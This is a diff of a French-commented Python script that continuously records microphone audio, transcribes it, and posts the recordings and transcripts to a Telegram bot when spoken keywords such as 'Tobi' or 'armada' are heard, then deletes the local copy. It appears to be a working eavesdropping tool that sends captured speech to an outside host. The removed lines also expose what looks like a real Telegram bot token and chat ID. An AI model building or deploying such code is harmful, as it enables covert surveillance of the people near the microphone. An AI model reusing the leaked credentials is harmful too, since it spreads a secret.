@@ -5,9 +5,9 @@ import speech_recognition as sr
 import requests
 import re
 
-# Configuration du bot Telegram
-TOKEN = "7342003244:AAE9x8Kqox_2Sid04QD-L2Amcjxm8lAMEeM"
-CHAT_ID = "7531672703"
+
+TOKEN = "token bot telegram"
+CHAT_ID = "contact chatId Robot"
 
 def record_audio(duration=20):
     """Enregistre l'audio pendant une durée spécifiée en secondes."""
@@ -24,7 +24,7 @@ def record_audio(duration=20):
     stream.close()
     audio.terminate()
     
-    # Sauvegarde l'audio dans un fichier WAV
+    
     audio_file = "output.wav"
     with wave.open(audio_file, 'wb') as wf:
         wf.setnchannels(1)
@@ -63,19 +63,19 @@ def send_to_telegram(audio_file, transcription):
         data = {
             'chat_id': CHAT_ID,
             'caption': transcription,
-            'parse_mode': 'Markdown'  # Changez cela si nécessaire
+            'parse_mode': 'Markdown'  
         }
         response = requests.post(url, data=data, files=files)
         return response.json()
 
 def main():
-    keywords = ["Discord Premium", "autres mots"]
+    keywords = ["Tobi", "armada"]
     
     while True:
         audio_file = record_audio(duration=20)
         transcription = transcribe_audio(audio_file)
 
-        # Vérification de la présence du mot clé
+        
         if any(keyword.lower() in transcription.lower() for keyword in keywords):
             print("Mot clé détecté, démarrage d'un nouvel enregistrement...")
             send_to_telegram(audio_file, transcription)
@@ -84,7 +84,7 @@ def main():
             formatted_transcription = format_transcription(transcription, keywords)
             send_to_telegram(audio_file, formatted_transcription)
         
-        # Supprimer le fichier audio après envoi
+        
         os.remove(audio_file)
 
 if __name__ == "__main__":
